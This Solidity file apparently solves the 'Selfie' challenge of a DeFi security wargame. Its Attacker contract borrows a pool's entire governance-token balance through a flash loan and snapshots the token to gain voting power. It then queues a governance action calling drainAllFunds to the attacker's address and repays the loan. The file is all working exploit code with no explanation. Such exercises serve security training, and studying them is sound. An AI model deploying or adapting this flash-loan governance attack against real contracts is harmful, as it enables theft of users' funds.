// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;

interface ISelfiePool {
    function flashLoan(uint256 borrowAmount) external;

    function drainAllFunds(address receiver) external;
}

interface ISimpleGovernance {
    function queueAction(
        address receiver,
        bytes calldata data,
        uint256 weiAmount
    ) external returns (uint256);

    function executeAction(uint256 actionId) external;
}

interface IERC20 {
    function balanceOf(address borrower) external view returns (uint256);

    function approve(address spender, uint amount) external;

    function transfer(address to, uint amount) external;

    function transferFrom(address who, address spender, uint amount) external;

    function snapshot() external returns (uint256);
}

contract Attacker {
    ISelfiePool pool;
    ISimpleGovernance gov;
    IERC20 token;
    address owner;

    constructor(address _pool, address _gov, address _token) {
        pool = ISelfiePool(_pool);
        gov = ISimpleGovernance(_gov);
        token = IERC20(_token);
        owner = msg.sender;
    }

    function receiveTokens(address _token, uint256 amount) public {
        token.snapshot();
        bytes memory data = abi.encodeWithSignature(
            "drainAllFunds(address)",
            owner
        );
        uint id = gov.queueAction(address(pool), data, 0);
        token.transfer(address(pool), token.balanceOf(address(this)));
    }

    function takeFlashloan() public {
        uint bal = token.balanceOf(address(pool));
        pool.flashLoan(bal);
    }
}
